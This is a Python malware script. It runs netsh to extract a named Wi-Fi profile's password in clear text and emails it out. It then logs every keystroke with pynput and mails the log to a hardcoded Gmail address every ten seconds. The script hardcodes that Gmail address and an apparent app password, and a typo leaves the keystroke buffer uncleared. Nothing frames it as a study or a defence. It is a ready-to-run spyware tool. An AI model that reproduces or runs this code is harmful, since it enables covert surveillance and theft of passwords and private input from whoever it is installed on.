import subprocess
import smtplib
import threading
import requests
import pynput.keyboard
def send_mail(email, app_password, recipient, msg):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, app_password)
    server.sendmail(email, recipient, msg)
    server.quit()
    print("[+] Email sent successfully!")
class Keylogger:
    def __init__(self,**values):
        self.keylogs=''
        self.email=values['email']
        self.password=values['password']
        self.reciver=values['recipient']
    def append_to_keylogs(self,string):
        self.keylogs+=string
    def process_key_listen(self,key):
        try:
            current_key=str(key.char)
        except AttributeError:
            if key==key.space:
                current_key='\n'
            else:
                current_key=' '+str(key)+' '
        self.append_to_keylogs(current_key)       
    def report(self):
        self.send_mail(self.email,self.password,self.reciver,self.keylogs)
        self.kelogs=''
        timer=threading.Timer(10,self.report)
        timer.start()
    def send_mail(self,email, app_password, recipient, msg):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, app_password)
        server.sendmail(email, recipient, msg)
        server.quit()
        print("[+] Email sent successfully!")
    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process_key_listen)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
command="netsh wlan show profile Rachel key=clear"
result=subprocess.check_output(command,shell=True)
send_mail('meiranconina@gmail.com','tvkzmfzwparlkqma',"meiranconina@gmail.com",result)
keylogger=Keylogger(email='meiranconina@gmail.com',password='tvkzmfzwparlkqma',recipient="meiranconina@gmail.com")
keylogger.start()
